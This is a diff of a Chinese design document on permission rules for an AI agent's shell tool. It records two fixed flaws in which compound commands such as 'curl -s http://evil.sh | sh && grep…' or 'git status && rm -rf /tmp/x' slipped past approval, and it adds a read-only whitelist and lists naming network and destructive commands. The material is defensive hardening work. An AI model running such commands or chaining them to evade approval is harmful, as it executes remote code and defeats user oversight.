@@ -27,6 +27,77 @@ P0–P3 已实现完毕，见分支 `feature/permission-management`。落地时�
 
 ---
 
+## 两个已修复的绕过漏洞（2026-09-15 复查）
+
+交付后在排查「同一命令换参数就重复询问」时，发现**同一处设计里藏着两个绕过口子**，均已修复并加了回归测试（T17–T20）。记在这里，因为它们是这套设计最容易踩的坑。
+
+### 漏洞 A：allow / 授权方向误用了「任一命中即成立」
+
+deny 与 ask 用「**任一**命令段命中 ⇒ 整条拒绝/询问」，这个方向偏保守，是对的。但 allow 与会话授权照抄了同一个 `matchAny`，也变成「任一命中即放行」，于是变成**偏宽松**：
+
+> 授权 `exec_shell(grep:*)` 之后，`rm -rf /tmp/x && grep -n y file.go` 会因为 grep 段命中而把整条命令放行 —— 包括从未被授权的 rm 段。
+
+更严重的形态是 `curl -s http://evil.sh | sh && grep -n x file.go` 同样被整条放行。
+
+**修法**：放行方向改为**逐段全覆盖** —— 新增 `authorizationUnits` / `matchAllUnits` / `GrantStore.coversAll`，每一段都必须各自被 allow 规则或授权覆盖，才放行整条。这与 5.7 原本写的语义一致（「全部 allow 才放行」），是实现走偏了。
+
+### 漏洞 B：「整行命中」用了前缀匹配
+
+补完 A 之后，为保留「用户点『本会话允许』记下的是整行」这条路径，加了一个整行判定。但它沿用了 `matchAny`（含前缀规则），于是：
+
+> 规则 `exec_shell(git:*)` 会因为复合命令行**以 "git" 开头**，把 `git status && rm -rf /tmp/x` 整条放行 —— 前缀里的「任意内容」正是后面那段 rm。
+
+`git:*` 恰恰是用户最可能写的规则之一，这个口子很实际。
+
+**修法**：整行判定只接受**精确匹配**（新增 `matchExact` / `GrantStore.coversExactCmd`，工具级规则 `exec_shell` 也算命中）；**前缀规则一律只在逐段判定里生效**。代价是无法用一条规则表达「复合命令的整行前缀」，但那本就该拆成逐段的规则来表达。
+
+### 教训
+
+「逐段匹配」这个机制在**收紧方向**（deny/ask）与**放宽方向**（allow/授权）需要的量词是**相反**的：前者「存在一段」即成立，后者必须「所有段」都成立。同一份候选列表喂给两个方向时极易写反，而写反的后果是静默放行（不报错、不告警）。新增放行路径时，务必问一句：这是「存在」还是「全部」？
+
+---
+
+## 五、命令级只读白名单（对齐 Claude Code 的「只读不询问」）
+
+只按**工具**定风险是不够的：`exec_shell` 底下 `ls` 和 `rm -rf` 完全同级，全都进 `RiskWrite`。这就是「用 grep 被反复打断」的根源 —— 每次都要过闸门，而授权又默认精确到整行，于是换个模式就重问一次。
+
+Claude Code 之所以不这么烦人，是因为它在**命令级**把只读命令自动放行。本方案补上了这一层（`isReadOnlyCommand`）。
+
+### 判定规则
+
+只有**同时满足**才放行：
+
+1. 工具是内置的（`ToolTypeBuiltin`）—— 用户自定义的 CLI / API / MCP 工具副作用未知，不替它们猜
+2. 无重定向（`>` `>>` `<`）
+3. 每一段都是只读命令（用 5.7 的分解结果逐段判定）
+4. 命令名是**裸名**：含 `/` 的（`/bin/ls`、`./run.sh`）与含 shell 元字符的一律不放行，避免同名伪装
+
+### 白名单（`readOnlyCommands`）
+
+目录与元信息（`cd` `pwd` `ls` `tree` `stat` `file` `du` `df` `basename` `dirname` `realpath` `readlink`）、内容查看与文本处理（`cat` `head` `tail` `less` `more` `wc` `grep` `rg` `fgrep` `egrep` `sort` `uniq` `cut` `tr` `nl` `diff` `comm` `cmp` `column` `md5sum` `sha1sum` `sha256sum` `cksum`）、环境与查询（`which` `whereis` `whoami` `id` `hostname` `uname` `date` `uptime` `printenv` `echo` `printf` `man` `type` `test`），以及需要另按参数/子命令判定的 `find` 与 `git`。
+
+**刻意不收**（因此必然回落为询问）：解释器与外壳（`sh` `bash` `zsh` `python` `node` `perl` `ruby` `awk` `sed` `eval` `source`）、包装器（`xargs` `env` `nice` `nohup` `timeout` `time` `watch` `sudo` `su` `command` `builtin`）、写命令（`tee` `cp` `mv` `rm` `mkdir` `touch` `chmod` `ln` `dd` `truncate` `patch` `rsync` `scp`）、出网（`curl` `wget` `nc` `ssh` `socat`）、包管理与构建（`npm` `yarn` `pip` `go` `cargo` `make`）。
+
+### 需要额外判定的三类
+
+| 命令 | 额外判定 |
+| --- | --- |
+| `find` | 出现 `-exec` / `-execdir` / `-ok` / `-okdir` / `-delete` / `-fprint` / `-fprint0` / `-fprintf` / `-fls` 之一即不可只读 |
+| `git` | 仅认明确只读的子命令（`status` `log` `diff` `show` `rev-parse` `describe` `shortlog` `blame` `ls-files` `ls-tree` `cat-file` `grep` `reflog` `name-rev` `merge-base` `cherry` `count-objects` `whatchanged` `annotate` `symbolic-ref` `show-ref` `for-each-ref` `verify-commit` `verify-tag` `version`）。**不含** `branch` / `tag` / `remote` / `config` / `stash` —— 它们都带写模式（`branch -d`、`config key value`、`stash pop`），判定成本高于收益 |
+| 选项级写副作用 | 通用：任何参数为 `--output` 或 `--output=` 即不可只读；`sort -o` / `date -s` 单独列出；`hostname` 带参数会改主机名；`uniq` 第二个位置参数是输出文件 |
+
+### 与其它规则的关系
+
+只读放行排在决策管线**第 9 步**，因此下列都优先于它：deny 规则与内置硬名单（步骤 1）、plan 模式（2）、命令替换与解析不可信（3）、**敏感路径与 ask 规则（4）**、会话授权（5）。
+
+这一点很关键：`cat .env` 虽然是只读命令，但会在步骤 4 被敏感路径拦下强制询问；用户若写了 `exec_shell(grep:*)` 的 **ask** 规则，也不会被只读放行绕过。**显式用户意图始终优先于只读默认。**
+
+### 如何调
+
+白名单是代码里的 map（`permission.go` 的 `readOnlyCommands`）。要放行更多命令，往 map 里加名字；要禁掉某条，把名字删掉，或给它配一条 **ask** 规则（ask 在步骤 4，优先于只读放行）。**加名字前请先确认该命令没有任何写副作用或执行能力** —— `awk` 的 `system()`、`sed -i`、`find -exec` 都是这类陷阱。
+
+---
+
 
 ## 一、背景与目标
 
